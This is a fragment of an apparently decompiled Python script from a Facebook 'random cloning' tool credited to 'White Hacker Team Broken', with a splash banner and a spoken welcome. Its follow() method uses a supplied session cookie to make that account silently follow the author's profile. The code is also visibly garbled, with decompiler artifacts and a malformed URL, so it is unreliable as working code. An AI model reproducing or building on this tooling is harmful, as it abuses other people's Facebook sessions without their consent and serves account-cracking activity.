...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100093374601356', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://www..facebook.com' + str(get), {
...
ha = current.day
today = date.today()
#os.system('xdg-open https://www.facebook.com/profile.php?id=100093374601356')
os.system('espeak -a 300 "WELCOME TO SAMIR RANDOM CLONING TOOLS"')
logo ="""
 
____    __    ____  __    __  .___________..______   
\   \  /  \  /   / |  |  |  | |           ||   _  \  
 \   \/    \/   /  |  |__|  | `---|  |----`|  |_)  | 
  \            /   |   __   |     |  |     |   _  <  
   \    /\    /    |  |  |  |     |  |     |  |_)  | 
...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  White Hacker Team Broken
\x1b[1;92m[+] ON FACEBOK   :  White Hacker Team Broken
